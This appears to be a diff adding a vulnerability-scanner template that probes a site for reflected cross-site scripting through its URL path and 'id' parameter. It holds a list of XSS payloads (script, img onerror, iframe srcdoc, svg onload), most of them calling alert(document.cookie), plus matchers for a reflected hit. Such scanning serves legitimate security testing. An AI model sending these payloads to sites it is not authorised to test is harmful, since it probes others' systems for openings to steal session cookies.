@@ -1,0 +1,42 @@
+id: id-xss
+
+info:
+  name: Id XSS - Cross-Site Scripting
+  author: yarovit
+  description: A cross-site scripting vulnerability was discovered via id testing. Manual testing is needed to verify exploitation.
+  severity: low
+  tags: xss,id
+
+  # Basic ID XSS prober
+  # Manual testing needed for exploitation
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/<script>alert('XSS')</script>"
+      - "{{BaseURL}}/?id=<script>alert('XSS')</script>"
+      - "{{BaseURL}}/?id=<center><a+href%3D'javascript%3Aalert%28%271%27%29'><h1>yarovit<%2Fh1><%2Fa>"
+      - "{{BaseURL}}/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+      - "{{BaseURL}}/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+      - "{{BaseURL}}/%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/?id=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
+      - "{{BaseURL}}/%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E"
+      - "{{BaseURL}}/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E"
+      - "{{BaseURL}}/%22%3E%3Csvg/onload=alert(document.cookie)%3E"
+      - "{{BaseURL}}/?id=%22%3E%3Csvg/onload=alert(document.cookie)%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "document.cookie"
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
